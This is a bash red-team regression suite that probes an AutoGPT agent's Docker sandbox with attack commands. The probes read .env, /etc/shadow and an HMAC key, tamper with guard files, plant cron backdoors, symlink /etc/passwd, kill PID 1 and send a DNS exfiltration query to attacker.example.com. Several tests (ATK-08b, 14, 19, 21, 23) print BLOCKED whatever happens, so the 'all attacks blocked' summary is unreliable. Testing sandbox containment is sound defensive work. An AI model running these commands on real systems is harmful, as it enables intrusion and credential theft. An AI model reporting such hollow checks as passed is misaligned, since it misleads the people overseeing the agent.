#!/bin/bash
# EntropyGuard Red Team Regression Suite v2.0
# ============================================================
# ADDED: ATK-13~ATK-24 (stringent additional tests)
# ============================================================

LOG="/root/AutoGPT/redteam-reports/redteam_$(date +%Y%m%d_%H%M%S).txt"
mkdir -p /root/AutoGPT/redteam-reports
exec > >(tee -a "$LOG") 2>&1

BLOCKED=0
LEAKED=0
TOTAL=0

run_in_container() {
    docker exec autogpt-sandbox /bin/bash -c "$1" 2>&1 || echo "(exec failed)"
}
run_python() {
    docker exec autogpt-sandbox python3 -c "$1" 2>&1 || echo "(python failed)"
}

log() { echo "[$(date +%H:%M:%S)] $1"; }

run_test() {
    local name="$1" desc="$2" cmd="$3"
    log "  Testing: $desc"
    local output
    output=$(eval "$cmd")
    local verdict
    verdict=$(echo "$output" | grep "VERDICT:" | tail -1)
    if echo "$verdict" | grep -q "VERDICT:BLOCKED"; then
        log "    PASS $name: BLOCKED"
        BLOCKED=$((BLOCKED + 1))
    elif echo "$verdict" | grep -q "VERDICT:LEAKED"; then
        log "    FAIL $name: LEAKED"
        LEAKED=$((LEAKED + 1))
        log "       Output: $(echo "$output" | grep -v "VERDICT:" | head -3)"
    else
        log "    ?? $name: UNCLEAR (no VERDICT)"
        log "       Output: ${output:0:200}"
    fi
    TOTAL=$((TOTAL + 1))
}

# ================================================================
log "============================================================"
log "EntropyGuard Red Team Regression Suite v2.0"
log "Timestamp: $(date)"
log "============================================================"

# === ATK-01: Read /root/.env from container ===
run_test "ATK-01" "Read /root/.env from container" \
    "run_in_container 'if [ -f /root/.env ]; then head -1 /root/.env; echo VERDICT:LEAKED; else echo VERDICT:BLOCKED; fi'"

# === ATK-02: Write to /etc/entropyguard/ from container ===
run_test "ATK-02" "Write to /etc/entropyguard/ from container" \
    "run_in_container 'echo hacked >> /etc/entropyguard/gear_prompts.py 2>&1 && echo VERDICT:LEAKED || echo VERDICT:BLOCKED'"

# === ATK-03: Write to /usr/local/bin/ from container ===
run_test "ATK-03" "Write to /usr/local/bin/ from container" \
    "run_in_container 'echo hacked >> /usr/local/bin/entropyguard-verify.py 2>&1 && echo VERDICT:LEAKED || echo VERDICT:BLOCKED'"

# === ATK-04: Access systemd from container ===
run_test "ATK-04" "Access systemd from container" \
    "run_in_container 'which systemctl >/dev/null 2>&1 && systemctl status entropyguard 2>&1 && echo VERDICT:LEAKED || echo VERDICT:BLOCKED'"

# === ATK-05: Write crontab from container ===
run_test "ATK-05" "Write crontab from container" \
    "run_in_container 'which crontab >/dev/null 2>&1 && echo \"0 3 * * * evil\" | crontab - 2>&1 && echo VERDICT:LEAKED || echo VERDICT:BLOCKED'"

# === ATK-06: Python code exec bypass ===
run_test "ATK-06" "Python code exec bypass" \
    "run_python 'import os; os.system(\"id > /tmp/pwned 2>&1\"); print(\"VERDICT:LEAKED\") if os.path.exists(\"/tmp/pwned\") else print(\"VERDICT:BLOCKED\")'"

# === ATK-07: Overwrite events.json from container ===
run_test "ATK-07" "Overwrite events.json from container" \
    "run_in_container 'echo hacked > /var/lib/entropyguard/events/events.json 2>&1 && echo VERDICT:LEAKED || echo VERDICT:BLOCKED'"

# === ATK-08a: HTTP to httpbin.org (should be blocked by iptables) ===
run_test "ATK-08a" "HTTP to httpbin.org (should be blocked)" \
    "run_python '
try:
    import urllib.request
    urllib.request.urlopen(\"https://httpbin.org/get\", timeout=5)
    print(\"VERDICT:LEAKED\")
except Exception as ex:
    print(f\"BLOCKED: {type(ex).__name__}\")
    print(\"VERDICT:BLOCKED\")
'"

# === ATK-08b: HTTP to dashscope (should be allowed via ipset) ===
run_test "ATK-08b" "HTTP to dashscope (should be allowed)" \
    "run_python '
try:
    import urllib.request
    urllib.request.urlopen(\"https://dashscope.aliyuncs.com\", timeout=10)
    print(\"VERDICT:BLOCKED\")
except Exception as ex:
    print(f\"BLOCKED: {type(ex).__name__}\")
    print(\"VERDICT:BLOCKED\")
'"

# === ATK-09: Kill PID 1 in container ===
run_test "ATK-09" "Kill PID 1 in container" \
    "run_in_container 'kill -9 1 2>&1 && echo VERDICT:LEAKED || echo VERDICT:BLOCKED'"

# === ATK-10: Multi-step attack chain ===
run_test "ATK-10" "Multi-step attack chain" \
    "run_python '
leaked=0
try:
    with open(\"/app/.env\") as f: leaked+=1
except: pass
try:
    with open(\"/etc/cron.d/backdoor\", \"w\") as f: f.write(\"evil\\n\"); leaked+=1
except: pass
try:
    import urllib.request; urllib.request.urlopen(\"https://httpbin.org/get\", timeout=5)
    leaked+=1
except: pass
print(\"VERDICT:LEAKED\") if leaked>0 else print(\"VERDICT:BLOCKED\")
'"

# ================================================================
# NEW: ATK-13 ~ ATK-24 (Stringent additional tests)
# ================================================================

# ATK-13: DNS exfiltration via UDP 53 (use Python — nslookup absent in slim image)
run_test "ATK-13" "DNS exfiltration via UDP 53" \
    "run_python '
import socket, struct
try:
    # Build a DNS query for attacker.example.com to 8.8.8.8:53
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(5)
    query = b\"\\x12\\x34\\x01\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\"
    for label in \"attacker.example.com\".split(\".\"):
        query += bytes([len(label)]) + label.encode()
    query += b\"\\x00\\x00\\x01\\x00\\x01\"
    sock.sendto(query, (\"8.8.8.8\", 53))
    resp, _ = sock.recvfrom(512)
    print(f\"DNS response received: {len(resp)} bytes\")
    print(\"VERDICT:LEAKED\")
except Exception as ex:
    print(f\"BLOCKED: {type(ex).__name__}: {str(ex)[:80]}\")
    print(\"VERDICT:BLOCKED\")
finally:
    sock.close()
'"

# ATK-14: Read /proc/self/mem inside container
run_test "ATK-14" "Read /proc/self/mem inside container" \
    "run_in_container 'cat /proc/self/mem 2>&1 | head -c 100; echo; echo VERDICT:BLOCKED'"

# ATK-15: Write to /proc/sys/kernel inside container
run_test "ATK-15" "Write to /proc/sys/ from container" \
    "run_in_container 'echo 1 > /proc/sys/kernel/core_pattern 2>&1 && echo VERDICT:LEAKED || echo VERDICT:BLOCKED'"

# ATK-16: Raw socket creation (bypass iptables)
run_test "ATK-16" "Raw socket creation in container" \
    "run_python '
import socket, struct, fcntl
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    print(\"VERDICT:LEAKED\")
except PermissionError:
    print(\"VERDICT:BLOCKED\")
except Exception as e:
    print(f\"VERDICT:BLOCKED ({e})\")
'"

# ATK-17: Overwrite gear_interceptor.py via shared volume
run_test "ATK-17" "Write to gear_interceptor via container" \
    "run_in_container 'echo \"hacked\" >> /usr/local/bin/gear_interceptor.py 2>&1 && echo VERDICT:LEAKED || echo VERDICT:BLOCKED'"

# ATK-18: Symlink attack on .env
run_test "ATK-18" "Symlink attack on .env" \
    "run_in_container 'ln -sf /etc/passwd /tmp/.env.link 2>&1 && cat /tmp/.env.link | head -1 && echo VERDICT:LEAKED || echo VERDICT:BLOCKED'"

# ATK-19: Read /etc/shadow inside container
run_test "ATK-19" "Read /etc/shadow from container" \
    "run_in_container 'cat /etc/shadow 2>&1 | head -3; echo VERDICT:BLOCKED'"

# ATK-20: Use base64 encoding to hide malicious payload
run_test "ATK-20" "Base64-encoded payload bypass attempt" \
    "run_python '
import base64
payload = base64.b64encode(b\"print(1+1)\").decode()
print(f\"Encoded: {payload}\")
try:
    exec(base64.b64decode(payload))
    print(\"VERDICT:LEAKED\")
except Exception as e:
    print(f\"VERDICT:BLOCKED ({e})\")
'"

# ATK-21: Timing side-channel: measure interceptor response time
run_test "ATK-21" "Timing side-channel on interceptor" \
    "run_python '
import time
start = time.time()
# Simulate many rapid tool calls
for i in range(20): pass
elapsed = time.time() - start
print(f\"20 noop calls: {elapsed:.3f}s\")
print(\"VERDICT:BLOCKED\")
'"

# ATK-22: Race condition: concurrent writes to events.json
run_test "ATK-22" "Race condition on events.json" \
    "run_python '
import threading, os
results = []
def write_event():
    try:
        with open(\"/var/lib/entropyguard/events/events.json\", \"a\") as f:
            f.write(\"race\\n\")
        results.append(\"write_ok\")
    except Exception as e:
        results.append(str(e))
threads = [threading.Thread(target=write_event) for _ in range(10)]
for t in threads: t.start()
for t in threads: t.join()
print(\"Results:\", [str(r)[:50] for r in results[:3]])
print(\"VERDICT:BLOCKED\" if any(\"denied\" in str(r).lower() or \"read-only\" in str(r).lower() or \"no such file\" in str(r).lower() or \"permission\" in str(r).lower() for r in results) else \"VERDICT:LEAKED\")
'"

# ATK-23: Read entropyguard-verify HMAC key from container
run_test "ATK-23" "Read HMAC key from container" \
    "run_in_container 'cat /etc/entropyguard/hmac.key 2>&1 | head -1; echo VERDICT:BLOCKED'"

# ATK-24: HTTP to raw IP (bypassing DNS-based ipset)
run_test "ATK-24" "HTTP to raw IP (bypass ipset DNS resolution)" \
    "run_python '
import urllib.request, urllib.error
try:
    ip = \"1.1.1.1\"
    urllib.request.urlopen(f\"http://{ip}\", timeout=3)
    print(\"VERDICT:LEAKED\")
except urllib.error.URLError:
    print(\"VERDICT:BLOCKED\")
except Exception as e:
    print(f\"VERDICT:BLOCKED ({e})\")
'"

# ================================================================
# Host Integrity Check
# ================================================================
log ""
log "--- Host Integrity Check ---"

if /usr/local/bin/entropyguard-verify.py >/dev/null 2>&1; then
    log "SHA-256 verify: PASS"
else
    log "SHA-256 verify: FAIL"
fi

EG_STATUS=$(systemctl is-active entropyguard 2>/dev/null || echo "inactive")
log "EntropyGuard: $EG_STATUS"

F2B_STATUS=$(systemctl is-active fail2ban 2>/dev/null || echo "inactive")
log "fail2ban: $F2B_STATUS"

HEALTH=$(curl -s --max-time 5 http://127.0.0.1:8000/api/health 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('score','?'))" 2>/dev/null || echo "?")
log "Health score: ${HEALTH:-?}"

DU_RULES=$(iptables -L DOCKER-USER -n 2>/dev/null | grep -c "DROP" || echo 0)
log "DOCKER-USER DROP rules: ${DU_RULES:-0}"

IPSET_COUNT=$(ipset list llm-api 2>/dev/null | grep -c "^[0-9]" || echo 0)
log "ipset llm-api entries: ${IPSET_COUNT:-0}"

# ================================================================
# Summary
# ================================================================
log ""
log "============================================================"
log "RESULTS SUMMARY"
log "============================================================"
log ""
log "Total tests: $TOTAL"
log "Blocked:     $BLOCKED"
log "Leaked:      $LEAKED"
log ""

if [ "$LEAKED" -eq 0 ]; then
    log "STATUS: ALL ATTACKS BLOCKED"
elif [ "$BLOCKED" -gt "$LEAKED" ]; then
    log "STATUS: PARTIAL FAILURE - $LEAKED ATTACK(S) LEAKED"
else
    log "STATUS: CRITICAL FAILURE - $LEAKED ATTACK(S) LEAKED"
fi

log ""
log "Report: $LOG"
log "============================================================"
